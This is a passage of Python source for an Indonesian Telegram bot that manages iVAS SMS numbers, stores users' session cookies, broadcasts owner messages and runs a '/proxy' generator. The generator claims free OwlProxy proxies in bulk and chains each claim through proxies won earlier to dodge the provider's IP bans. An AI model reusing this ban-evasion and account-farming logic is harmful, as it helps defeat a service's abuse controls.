        result_text += f"\n...dan {len(results)-10} lainnya"

    try:
        await msg_ref.edit_text(
            result_text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("CARI LAGI", callback_data=f"menu_addrange_{user_id}", style="primary"),
                    InlineKeyboardButton("EXPORT NOMOR", callback_data=f"menu_export_{user_id}", style="primary")
                ],
                [
                    InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]
            ])
        )
    except Exception as e:
        logger.error(f"Error updating batch final message: {e}")

    print(f"[BATCH END] Waktu total: {elapsed} detik, Sukses: {total_success}, Gagal: {total_failed}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler pesan biasa - dengan dukungan format nomor|negara"""
    if not update.effective_user:
        return
    user_id = update.effective_user.id
    text = update.message.text or ""
    chat_type = update.effective_chat.type

    # ── Sender login: tangkap OTP / 2FA password ──
    if context.user_data.get('awaiting_sender_otp') or context.user_data.get('awaiting_sender_2fa'):
        await _sender_finish_otp(update, context, text)
        return

    # ── LOGIN mode: tangkap phone:code atau 2FA password ──
    if context.user_data.get(f'tgcheck_login_mode_{user_id}'):
        if context.user_data.get(f'tgcheck_login_2fa_{user_id}'):
            # 2FA password input
            await _login_finish_2fa(update, context, text)
            return
        if ':' in text and len(text) >= 5:
            await _login_finish_code(update, context, text)
            return

    # ── FIX MERAH wizard: tangkap input nomor sebelum gate is_allowed_user ──
    if context.user_data.get('fixmenu_waiting'):
        context.user_data.pop('fixmenu_waiting', None)
        context.user_data.pop('fixmenu_message_id', None)
        # Re-route teks sebagai argumen /fix tanpa mengubah command
        context.args = [text.strip()]
        try:
            await fix_command(update, context)
        except Exception as e:
            try:
                await update.message.reply_text(
                    _screen('FIX MERAH WHATSAPP',
                            f"{em(E2,'❌')} <b>Gagal memproses.</b>\n{html.escape(str(e))}"),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
        return

    if not is_allowed_user(user_id):
        return

    # Auto-update username Telegram di DB
    update_user_username(update.effective_user)

    # OWNER STATE HANDLERS
    if is_owner(user_id) or is_admin(user_id):
        if context.user_data.get(f'waiting_owner_add_user_{user_id}'):
            context.user_data.pop(f'waiting_owner_add_user_{user_id}', None)
            context.args = [text.strip()]
            await adduser_command(update, context)
            return
            
        if context.user_data.get(f'waiting_owner_bc_{user_id}'):
            context.user_data.pop(f'waiting_owner_bc_{user_id}', None)
            context.args = [text.strip()]
            await bc_command(update, context)
            return

        if context.user_data.get(f'waiting_owner_add_admin_{user_id}'):
            context.user_data.pop(f'waiting_owner_add_admin_{user_id}', None)
            context.args = [text.strip()]
            await addadmin_command(update, context)
            return

        if context.user_data.get(f'waiting_owner_ban_user_{user_id}'):
            context.user_data.pop(f'waiting_owner_ban_user_{user_id}', None)
            context.args = [text.strip()]
            await ban_command(update, context)
            return

        if context.user_data.get(f'waiting_owner_unban_user_{user_id}'):
            context.user_data.pop(f'waiting_owner_unban_user_{user_id}', None)
            context.args = [text.strip()]
            await unban_command(update, context)
            return

    # LINE EXTRACTOR: jika user sedang menunggu range input
    if context.user_data.get(f'line_waiting_range_{user_id}'):
        try:
            consumed = await handle_line_range_input(update, context)
            if consumed:
                return
        except Exception as e:
            logger.error(f"Line extractor error: {e}")

    # SMS AKTIF: user kirim bot token
    if context.user_data.get(f'waiting_smsaktif_token_{user_id}'):
        context.user_data.pop(f'waiting_smsaktif_token_{user_id}', None)
        bot_token_input = text.strip()

        # Validate format (basic check: contains colon)
        if ':' not in bot_token_input or len(bot_token_input) < 30:
            await update.message.reply_text(
                f"❌ <b>Format bot token tidak valid!</b>\n\n"
                f"Token harus dalam format:\n"
                f"<code>123456789:ABCDefGHIjklMNOpqrSTUvwxYZ</code>\n\n"
                f"Silakan coba lagi.",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("COBA LAGI", callback_data=f"smsaktif_settoken_{user_id}", icon_custom_emoji_id="5870892901159932239", style="primary")],
                    [InlineKeyboardButton("KEMBALI", callback_data=f"smsaktif_menu_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
                ])
            )
            return

        msg = await update.message.reply_text(
            f"{em(CE_LOADING,'🟠')} <i>Memvalidasi bot token...</i>",
            parse_mode=ParseMode.HTML
        )

        # Validate token
        valid, bot_info = await bg.run(user_id, _validate_bot_token, bot_token_input)

        if not valid:
            await msg.edit_text(
                f"❌ <b>Bot token tidak valid!</b>\n\n"
                f"Pastikan token benar dan bot masih aktif.\n"
                f"Error: <code>{str(bot_info)[:100]}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("COBA LAGI", callback_data=f"smsaktif_settoken_{user_id}", icon_custom_emoji_id="5870892901159932239", style="primary")],
                    [InlineKeyboardButton("KEMBALI", callback_data=f"smsaktif_menu_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
                ])
            )
            return

        bot_username = bot_info.get('username', 'unknown')
        bot_name = bot_info.get('first_name', 'Bot')

        # Save token with user's chat_id
        save_user_bot_token(user_id, bot_token_input, user_id)

        # Send test message to verify
        test_text = (
            f"🤖 <b>Bot Connected - SMS AKTIF</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"✅ Bot ini terhubung dengan SMS AKTIF.\n"
            f"📩 Semua SMS baru akan dikirim ke sini.\n\n"
            f"Klik START di menu utama untuk mulai monitoring.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        success, _ = await bg.run(user_id, _send_to_user_bot, bot_token_input, user_id, test_text, None)

        if success:
            await msg.edit_text(
                f"✅ <b>BOT TOKEN TERSIMPAN!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🤖 <b>Bot</b>: @{bot_username} ({bot_name})\n"
                f"💬 <b>Chat ID</b>: <code>{user_id}</code>\n\n"
                f"✅ Test message berhasil dikirim ke bot kamu!\n"
                f"Sekarang kamu bisa START SMS AKTIF.\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("START SMS AKTIF", callback_data=f"smsaktif_start_{user_id}", icon_custom_emoji_id="5870921127685001066", style="success")],
                    [InlineKeyboardButton("KEMBALI", callback_data=f"smsaktif_menu_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
                ])
            )
        else:
            await msg.edit_text(
                f"⚠️ <b>TOKEN TERSIMPAN (dengan peringatan)</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🤖 Bot: @{bot_username}\n"
                f"⚠️ Test message gagal dikirim.\n\n"
                f"<b>Pastikan kamu sudah /start bot kamu terlebih dahulu!</b>\n"
                f"Buka @{bot_username} dan tekan /start, lalu coba lagi.\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("START SMS AKTIF", callback_data=f"smsaktif_start_{user_id}", icon_custom_emoji_id="5870921127685001066", style="success")],
                    [InlineKeyboardButton("GANTI TOKEN", callback_data=f"smsaktif_settoken_{user_id}", icon_custom_emoji_id="5870892901159932239", style="primary")],
                    [InlineKeyboardButton("KEMBALI", callback_data=f"smsaktif_menu_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
                ])
            )
        return

    if context.user_data.get(f'waiting_email_{user_id}') and chat_type == "private":
        
        if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', text):
            email_input = text.strip()
            
            
            context.user_data.pop(f'waiting_email_{user_id}', None)
            
            
            pending = context.user_data.get(f'pending_cookies_{user_id}')
            
            if not pending:
                await update.message.reply_text(
                    " Data cookies sudah expired. Silahkan kirim ulang cookies.",
                    reply_markup=get_back_keyboard(user_id)
                )
                return
            
            msg = await update.message.reply_text(
                f"{em(CE_LOADING,'🟠')} <i>Menyimpan session dengan email:</i>\n<code>{email_input}</code>",
                parse_mode=ParseMode.HTML
            )
            
            
            session = requests.Session()
            saved_cookies = pending.get('session_cookies', pending.get('cookies_dict', {}))
            for key, value in saved_cookies.items():
                session.cookies.set(key, value)
            
            session.headers.update({
                'User-Agent': session.headers.get('User-Agent', get_random_user_agent()),
            })
            
            csrf = pending.get('csrf')
            
            
            if not csrf:
                try:
                    resp = session.get(NUMBERS_PAGE_URL, timeout=15)
                    if resp.status_code == 200:
                        csrf = extract_csrf_from_page(resp.text)
                except:
                    pass
            
            
            profile = {
                'name': None,
                'email': email_input,
                'country': None,
                'phone': None
            }
            
            
            try:
                profile_resp = session.get(PROFILE_URL, timeout=15)
                if profile_resp.status_code == 200 and "portal" in profile_resp.url:
                    full_profile = extract_profile_from_html(profile_resp.text)
                    if full_profile:
                        
                        if not full_profile.get('email'):
                            full_profile['email'] = email_input
                        profile = full_profile
                        print(f"[DEBUG] Berhasil ambil profile lengkap: {profile}")
            except Exception as e:
                print(f"[DEBUG] Gagal ambil profile lengkap: {e}")
            
            
            save_result, _ = save_cookies_session(user_id, email_input, session, csrf, profile)
            
            if save_result:
                
                profile_text = f"\n{EMOJI['MAIL']} Email: {email_input}"
                if profile.get('name'):
                    profile_text += f"\n{EMOJI['NAME']} Nama: {profile['name']}"
                if profile.get('country'):
                    profile_text += f"\n{EMOJI['COUNTRY']} Negara: {profile['country']}"
                
                await msg.edit_text(
                    _build(TEMPLATE_SUCCESS, 'SUKSES', 
                        message=f"{em(E1, '⭐')} <b>LOGIN BERHASIL</b>{profile_text}\n\n Cookies tersimpan dengan email manual"
                    ),
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                    ]])
                )
                
                
                context.user_data.pop(f'pending_cookies_{user_id}', None)
            else:
                await msg.edit_text(
                    " Gagal menyimpan session. Coba kirim cookies lagi.",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_keyboard(user_id)
                )
            return
        
        else:
            
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>Format email tidak valid!</b>\n\n"
                f"Masukkan email yang benar.\n"
                f"Contoh: user@gmail.com",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")
                ]])
            )
            return
    
    if '|' in text and not text.startswith('/') and chat_type == "private":
        
        parts = text.split('|', 1)
        if len(parts) == 2:
            search_term = parts[0].strip()
            country_filter = parts[1].strip()
            
            
            if search_term.isdigit() and country_filter.isalpha():
                
                context.args = [text]
                await add_range_command(update, context)
                return

    
    if not text.startswith('/') and ('cookie' in text.lower() or 'XSRF' in text or 'ivas_sms_session' in text):
        await cookies_command(update, context)
        return

    
 #   await update.message.reply_text(
 #       "Gunakan /start untuk menu utama\n"
 #       "Atau gunakan format:\n"
 #       "• 59127|bolivia - Cari range\n"
 #       "• Kirim cookies untuk login",
 #       reply_markup=get_back_keyboard(user_id)
 #   )



async def bc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner Broadcast Command /bc [pesan]"""
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return
        
    if not context.args:
        await update.message.reply_text(
            f"{em(E2, '⭐')} <b>Format Salah!</b>\n\nGunakan: <code>/bc [pesan]</code>",
            parse_mode=ParseMode.HTML
        )
        return
        
    pesan = " ".join(context.args)
    
    # Kirim status awal ke owner
    status_msg = await update.message.reply_text(
        f"📢 <b>Memulai Broadcast...</b>\nMengambil data user dari database.",
        parse_mode=ParseMode.HTML
    )
    
    try:
        cur.execute("SELECT DISTINCT user_id FROM allowed_users UNION SELECT DISTINCT user_id FROM user_sessions")
        rows = cur.fetchall()
        user_ids = [row[0] for row in rows]
    except Exception as e:
        await status_msg.edit_text(f"❌ <b>Gagal mengambil data user:</b> {e}", parse_mode=ParseMode.HTML)
        return
        
    if not user_ids:
        await status_msg.edit_text("❌ <b>Tidak ada user yang ditemukan di database.</b>", parse_mode=ParseMode.HTML)
        return
        
    success = 0
    failed = 0
    total = len(user_ids)
    
    broadcast_text = (
        f"📢 <b>PENGUMUMAN DARI OWNER</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{pesan}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>IVASMS Number Manager Bot</i>"
    )
    
    start_time = time.time()
    for idx, target_id in enumerate(user_ids):
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=broadcast_text,
                parse_mode=ParseMode.HTML
            )
            success += 1
        except Exception as e:
            failed += 1
            print(f"[BC ERROR] Gagal mengirim ke {target_id}: {e}")
            
        if (idx + 1) % 10 == 0 or (idx + 1) == total:
            elapsed = int(time.time() - start_time)
            await status_msg.edit_text(
                f"📢 <b>Progress Broadcast:</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 Progress: {idx+1}/{total}\n"
                f"✅ Sukses: {success}\n"
                f"❌ Gagal: {failed}\n"
                f"⏱️ Waktu: {elapsed}s\n"
                f"━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML
            )
        await asyncio.sleep(0.05)
        
    elapsed = int(time.time() - start_time)
    await status_msg.edit_text(
        f"📢 <b>BROADCAST SELESAI!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total Target: {total}\n"
        f"✅ Berhasil Terkirim: {success}\n"
        f"❌ Gagal/Blocked: {failed}\n"
        f"⏱️ Waktu Total: {elapsed}s\n"
        f"━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML
    )

async def mt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner Maintenance Mode.

    Format:
      /mt                  - tampilkan status semua fitur
      /mt on               - aktifkan blanket (all)
      /mt off              - matikan blanket (all)
      /mt on fix           - aktifkan maintenance untuk fitur 'fix' saja
      /mt off ivas         - matikan maintenance untuk fitur 'ivas'
      /mt on all           - sama dengan /mt on
    """
    global MAINTENANCE_MODE
    user_id = update.effective_user.id
    if not is_owner(user_id):
        return

    def _render_status():
        lines = []
        for k in MAINTENANCE_FEATURES:
            mark = "🟠 ON " if MAINTENANCE_STATE.get(k) else "🟢 OFF"
            lines.append(f"  {mark}  <code>{k}</code>")
        return (
            f"🔧 <b>Maintenance Status</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            + "\n".join(lines) +
            f"\n\n<b>Cara pakai:</b>\n"
            f"  <code>/mt on</code> — semua fitur\n"
            f"  <code>/mt on fix</code> — hanya fitur fix\n"
            f"  <code>/mt off ivas</code> — matikan maintenance ivas\n"
            f"  <code>/mt</code> — lihat status\n\n"
            f"<b>Daftar fitur:</b> {', '.join(MAINTENANCE_FEATURES)}"
        )

    if not context.args:
        await update.message.reply_text(_render_status(), parse_mode=ParseMode.HTML)
        return

    action = context.args[0].lower()
    if action not in ("on", "off"):
        await update.message.reply_text(
            f"❌ <b>Format salah.</b>\n\n{_render_status()}",
            parse_mode=ParseMode.HTML,
        )
        return

    # Default fitur = 'all' kalau tidak disebut
    feature = (context.args[1].lower() if len(context.args) >= 2 else 'all')
    if feature not in MAINTENANCE_FEATURES:
        await update.message.reply_text(
            f"❌ Fitur <code>{feature}</code> tidak dikenal.\n\n"
            f"Pilihan: {', '.join(MAINTENANCE_FEATURES)}",
            parse_mode=ParseMode.HTML,
        )
        return

    MAINTENANCE_STATE[feature] = (action == 'on')
    save_maintenance_status()
    MAINTENANCE_MODE = bool(MAINTENANCE_STATE.get('all', False))

    pretty = feature.upper() if feature != 'all' else 'SEMUA FITUR'
    icon = "🟠" if action == 'on' else "🟢"
    verb = "diaktifkan" if action == 'on' else "dimatikan"
    await update.message.reply_text(
        f"{icon} <b>Maintenance {pretty} {verb}.</b>\n\n{_render_status()}",
        parse_mode=ParseMode.HTML,
    )

# ════════════════════════════════════════════════════════════════
#  /proxy COMMAND — OwlProxy Auto-Registration (Free Proxy)
# ════════════════════════════════════════════════════════════════

import owlproxy_auto as _owl
import pathlib as _pathlib

_PROXY_SEM = asyncio.Semaphore(3)  # max 3 concurrent proxy workers
_proxy_active: dict[int, bool] = {}
_PROXY_OUT = _pathlib.Path(_owl.__file__).parent / "proxies_won.txt"
_PROXY_MAX_WORKERS = 3  # parallel threads per batch


def _load_upstream_proxy() -> str | None:
    """Load the last won proxy from proxies_won.txt to use as upstream."""
    try:
        lines = _PROXY_OUT.read_text(encoding="utf-8").strip().splitlines()
        for line in reversed(lines):
            line = line.strip()
            if line.startswith("socks5://") or line.startswith("http://"):
                return line
    except Exception:
        pass
    return None


def _save_user_proxy(user_id: int, proto: str, p: dict) -> None:
    """Simpan proxy hasil generate ke DB user."""
    host = p.get('proxyHost', '')
    port = str(p.get('proxyPort', ''))
    user = p.get('userName', '')
    pwd = p.get('password', '')
    scheme = "socks5" if proto == "socks5" else "http"
    uri = f"{scheme}://{user}:{pwd}@{host}:{port}"
    try:
        cur.execute(
            "INSERT INTO user_proxies (user_id, proto, host, port, username, password, uri) "
            "VALUES (?,?,?,?,?,?,?)",
            (user_id, proto, host, port, user, pwd, uri),
        )
        conn.commit()
    except Exception as e:
        print(f"[PROXY] save db warn: {e}")


def _get_user_proxies(user_id: int) -> list[dict]:
    """Ambil semua proxy tersimpan milik user (terbaru dulu)."""
    try:
        cur.execute(
            "SELECT id, proto, host, port, username, password, uri "
            "FROM user_proxies WHERE user_id=? ORDER BY id DESC",
            (user_id,),
        )
        rows = cur.fetchall()
        return [
            {'id': r[0], 'proto': r[1], 'host': r[2], 'port': r[3],
             'username': r[4], 'password': r[5], 'uri': r[6]}
            for r in rows
        ]
    except Exception as e:
        print(f"[PROXY] load db warn: {e}")
        return []


def _delete_dead_proxies(ids: list[int]) -> None:
    """Hapus proxy mati dari DB."""
    if not ids:
        return
    try:
        cur.executemany("DELETE FROM user_proxies WHERE id=?", [(i,) for i in ids])
        conn.commit()
    except Exception as e:
        print(f"[PROXY] delete warn: {e}")


def _test_proxy_sync(pr: dict, timeout: int = 12) -> bool:
    """Tes proxy beneran konek apa enggak — hit ip-check endpoint via proxy."""
    proto = pr.get('proto', 'socks5')
    scheme = "socks5h" if proto == "socks5" else "http"
    uri = f"{scheme}://{pr['username']}:{pr['password']}@{pr['host']}:{pr['port']}"
    proxies = {"http": uri, "https": uri}
    for test_url in ("https://api.ipify.org?format=json", "http://ip-api.com/json"):
        try:
            r = requests.get(test_url, proxies=proxies, timeout=timeout, verify=False)
            if r.status_code == 200 and r.text:
                return True
        except Exception:
            continue
    return False


async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/proxy [jumlah] — buat proxy SOCKS5/HTTP gratis via OwlProxy. Public."""
    user_id = update.effective_user.id

    count = 1
    if context.args and context.args[0].isdigit():
        count = int(context.args[0])

    is_owner_user = (user_id == USER_ID)
    max_proxy = 999 if is_owner_user else 5
    if count < 1 or count > max_proxy:
        limit_note = "" if is_owner_user else f" (max {max_proxy})"
        await update.message.reply_text(
            _screen('PROXY',
                    f"{em(E2,'❌')} Jumlah harus 1–{max_proxy}{limit_note}"),
            parse_mode=ParseMode.HTML,
        )
        return

    if _proxy_active.get(user_id):
        await update.message.reply_text(
            _screen('PROXY',
                    f"{em(CE_LOADING,'⏳')} <b>Proses proxy sebelumnya masih berjalan.</b>\n"
                    f"<i>Tunggu sampai selesai.</i>"),
            parse_mode=ParseMode.HTML,
        )
        return

    context.user_data[f"proxy_count_{user_id}"] = count

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(
                "SOCKS5", callback_data=f"proxy_socks5_{user_id}",
                icon_custom_emoji_id=CE_NEGARA, style="primary"),
            InlineKeyboardButton(
                "HTTP", callback_data=f"proxy_http_{user_id}",
                icon_custom_emoji_id=CE_NEGARA, style="success"),
        ],
        [
            InlineKeyboardButton(
                "BATAL", callback_data=f"proxy_cancel_{user_id}",
                icon_custom_emoji_id=CE_BACK, style="danger"),
        ],
    ])

    plural = f"<b>{count}</b> proxy" if count > 1 else "proxy"
    await update.message.reply_text(
        _screen('PROXY GENERATOR', (
            f"{em(CE_NEGARA,'🌐')} <b>Proxy Ibulu Gratis</b>\n\n"
            f"{em(CE_WAKTU,'📋')} Akan membuat {plural}.\n"
            f"<i>Pilih tipe di bawah:</i>"
        )),
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard,
    )


async def _proxy_worker(proto: str, count: int, user_id: int, message, bot):
    """Background worker: creates proxies with parallel threads."""
    _proxy_active[user_id] = True
    won: list[dict] = []
    errors: list[str] = []
    total = count
    _last_edit = [0.0]

    async def _update_progress(stage: str = "", force: bool = False):
        now = time.time()
        if not force and (now - _last_edit[0]) < 2.5:
            return
        _last_edit[0] = now

        bar_len = 12
        done = len(won) + len(errors)
        filled = int(bar_len * done / total) if total else bar_len
        bar = "█" * filled + "░" * (bar_len - filled)
        pct = int(done / total * 100) if total else 0

        text = (
            f"  <code>{bar}</code>  <b>{pct}%</b>  ({done}/{total})\n\n"
            f"  {em(E1,'✅')} Berhasil: <b>{len(won)}</b>\n"
            f"  {em(E2,'❌')} Gagal: <b>{len(errors)}</b>\n"
        )
        if stage:
            text += f"\n  {em(CE_WAKTU,'⏲')} <i>{stage}</i>"

        try:
            await message.edit_text(
                _screen(f'PROXY · {proto.upper()}', text),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    try:
        # Load existing proxy as upstream to avoid IP ban
        upstream = _load_upstream_proxy()
        if upstream:
            _owl.log.info("using upstream proxy: %s", upstream[:40])

        loop = asyncio.get_running_loop()

        def _do_one(idx: int, upstream_: str | None):
            """Single proxy creation with retry."""
            last_err = None
            for _attempt in range(3):
                try:
                    return _owl.run_once(
                        proto=proto, country="US", count=1,
                        time_min=5, host=None,
                        http_proxy=upstream_,
                    )
                except Exception as e:
                    last_err = e
                    if "IP_FLAG_1059" in str(e):
                        time.sleep(90)
                    else:
                        time.sleep(5)
            raise last_err

        await _update_progress("Memulai...", force=True)

        # Run workers in parallel batches
        batch_size = min(_PROXY_MAX_WORKERS, total)
        i = 0
        while i < total:
            batch_end = min(i + batch_size, total)
            futs = []
            for idx in range(i, batch_end):
                # After first success, chain through won proxy
                up = upstream
                if won:
                    last = won[-1]
                    up = f"socks5://{last['userName']}:{last['password']}@{last['proxyHost']}:{last['proxyPort']}"
                futs.append(loop.run_in_executor(None, _do_one, idx, up))

            for fut in asyncio.as_completed(futs):
                try:
                    proxies = await asyncio.wait_for(fut, timeout=600)
                    if proxies:
                        won.extend(proxies)
                        # Save immediately
                        for p in proxies:
                            _save_user_proxy(user_id, proto, p)
                            uri = f"socks5://{p['userName']}:{p['password']}@{p['proxyHost']}:{p['proxyPort']}" if proto == "socks5" else f"http://{p['userName']}:{p['password']}@{p['proxyHost']}:{p['proxyPort']}"
                            try:
                                with _PROXY_OUT.open("a", encoding="utf-8") as f:
                                    f.write(f"# bot user={user_id} {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                                    f.write(uri + "\n")
                            except Exception:
                                pass
                except asyncio.TimeoutError:
                    errors.append("Timeout")
                except Exception as e:
                    err = str(e)[:60]
                    if "IP_FLAG_1059" in err:
                        errors.append("IP banned")
                    elif "claim failed" in err:
                        errors.append("Claim gagal")
                    elif "OTP timed out" in err:
                        errors.append("OTP timeout")
                    else:
                        errors.append(err[:40])

                await _update_progress(f"Worker aktif...")

            i = batch_end

        # ── Build final result message (premium tampilan)
        ptype_label = proto.upper()
        status_emoji = em(E1, '✅') if won else em(E2, '❌')
        status_word = _fancy_italic('Sukses') if won else _fancy_italic('Gagal')
        result_parts = [
            f"{em(CE_LOADING,'⚡️')} <b>{_fancy_bold('Status')}</b> : {status_word} {status_emoji}\n"
            f"{em(CE_NEGARA,'🌍')} <b>{_fancy_bold('Tipe')}</b>   : <b>{_fancy_bold(ptype_label)}</b> <i>{_fancy_italic('Private')}</i>\n"
            f"{em(CE_WAKTU,'⏱️')} <b>{_fancy_bold('Waktu')}</b>  : 5 {_fancy_italic('menit')}\n"
        ]

        if won:
            result_parts.append(f"\n{em(CE_FILE,'📦')} <b>Hasil</b> ({len(won)}/{total})\n\n")
            for idx, p in enumerate(won, 1):
                host = p.get('proxyHost', '?')
                port = p.get('proxyPort', '?')
                user = p.get('userName', '?')
                pwd = p.get('password', '?')
                result_parts.append(
                    f"➤ <b>Proxy #{idx}</b>\n"
                    f"<code>{host}:{port}:{user}:{pwd}</code>\n"
                    f"<i>└ tap buat copy</i> {em('5388609266850476233','⬆️')}\n\n"
                )

        result_parts.append(
            f"\n{em(E1,'✅')} <b>Berhasil</b>: {len(won)}   "
            f"{em(E2,'❌')} <b>Gagal</b>: {len(errors)}\n"
        )

        if errors:
            err_cats = {}
            for e in errors:
                err_cats[e] = err_cats.get(e, 0) + 1
            err_lines = "\n".join(f"  • {k}: <b>{v}x</b>" for k, v in err_cats.items())
            result_parts.append(f"\n{em(E2,'⚠️')} <b>Errors:</b>\n{err_lines}")

        result_text = "".join(result_parts)

        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton(
                    "BUAT LAGI", callback_data=f"proxy_again_{user_id}",
                    icon_custom_emoji_id=CE_ADD, style="primary"),
                InlineKeyboardButton(
                    "TUTUP", callback_data=f"proxy_close_{user_id}",
                    icon_custom_emoji_id=CE_BACK, style="danger"),
            ]
        ])

        # If in group chat, send result to private
        if message.chat.type != "private":
            try:
                await bot.send_message(
                    chat_id=user_id,
                    text=_screen(f'PROXY · {proto.upper()} · SELESAI', result_text),
                    parse_mode=ParseMode.HTML,
                    reply_markup=kb,
                )
                await message.edit_text(
                    _screen(f'PROXY · {proto.upper()}',
                            f"{em(E1,'✅')} <b>Selesai!</b> {len(won)}/{total} proxy berhasil.\n"
                            f"<i>Hasil dikirim ke private chat.</i>"),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                await message.edit_text(
                    _screen(f'PROXY · {proto.upper()} · SELESAI', result_text),
                    parse_mode=ParseMode.HTML, reply_markup=kb,
                )
        else:
            await message.edit_text(
                _screen(f'PROXY · {proto.upper()} · SELESAI', result_text),
                parse_mode=ParseMode.HTML, reply_markup=kb,
            )

    except Exception as e:
        import traceback as _tb
        _tb.print_exc()
        try:
            await message.edit_text(
                _screen('PROXY · ERROR',
                        f"{em(E2,'❌')} <b>Fatal error:</b>\n"
                        f"<code>{html.escape(str(e)[:200])}</code>"),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    finally:
        _proxy_active[user_id] = False


async def myproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/myproxy — tampilkan proxy tersimpan user, tes hidup/mati dulu. Public."""
    user_id = update.effective_user.id

    proxies = _get_user_proxies(user_id)
    if not proxies:
        await update.message.reply_text(
            _screen('MY PROXY',
                    f"{em(E2,'❌')} <b>Belum ada proxy tersimpan.</b>\n"
                    f"<i>Generate dulu pakai /proxy ya.</i>"),
            parse_mode=ParseMode.HTML,
        )
        return

    msg = await update.message.reply_text(
        _screen('MY PROXY',
                f"{em(CE_LOADING,'🔄')} <b>Mengetes {len(proxies)} proxy...</b>\n"
                f"<i>Bentar ya, cek hidup/mati dulu.</i>"),
        parse_mode=ParseMode.HTML,
    )

    loop = asyncio.get_running_loop()
    # Tes paralel semua proxy
    results = await asyncio.gather(
        *[loop.run_in_executor(None, _test_proxy_sync, pr) for pr in proxies],
        return_exceptions=True,
    )

    alive: list[dict] = []
    dead_ids: list[int] = []
    for pr, ok in zip(proxies, results):
        if ok is True:
            alive.append(pr)
        else:
            dead_ids.append(pr['id'])

    # Buang yang mati dari DB biar rapi
    _delete_dead_proxies(dead_ids)

    parts = [
        f"{em(E1,'✅')} <b>Hidup</b>: {len(alive)}   "
        f"{em(E2,'❌')} <b>Mati</b>: {len(dead_ids)}\n"
    ]

    if alive:
        # Kirim sebagai file .txt
        import tempfile, os
        lines = []
        for pr in alive:
            ptype = (pr.get('proto') or 'socks5').lower()
            lines.append(f"{ptype}://{pr['username']}:{pr['password']}@{pr['host']}:{pr['port']}")
        
        content = "\n".join(lines)
        tmp_path = os.path.join(tempfile.gettempdir(), f"myproxy_{user_id}.txt")
        with open(tmp_path, 'w') as f:
            f.write(content)
        
        try:
            await msg.delete()
        except:
            pass
        
        caption = _screen('MY PROXY · SELESAI', "\n".join(parts) + f"\n{em(CE_FILE,'📦')} <b>{len(alive)} proxy aktif</b>")
        await update.message.reply_document(
            document=open(tmp_path, 'rb'),
            filename=f"proxy_alive_{len(alive)}.txt",
            caption=caption,
            parse_mode=ParseMode.HTML,
        )
        try:
            os.remove(tmp_path)
        except:
            pass
    else:
        parts.append(
            f"\n{em(E2,'⚠️')} <i>Semua proxy mati & sudah dibersihkan.</i>\n"
            f"<i>Generate baru pakai /proxy.</i>"
        )
        try:
            await msg.edit_text(
                _screen('MY PROXY · SELESAI', "".join(parts)),
                parse_mode=ParseMode.HTML,
            )
        except:
            pass


# ════════════════════════════════════════════════════════
#                 LINE EXTRACTOR FEATURE
# ════════════════════════════════════════════════════════

def _parse_line_ranges(text: str, total: int):
    """Parse range string seperti '1-100', '1-50,200-300', '50' jadi list of (start,end).
    Return (ranges, error_msg)."""
    if not text:
        return None, "Range kosong"
    text = text.strip().replace(' ', '')
    out = []
    try:
        for part in text.split(','):
            if not part:
                continue
            if '-' in part:
                a, b = part.split('-', 1)
                s, e = int(a), int(b)
            else:
                s = e = int(part)
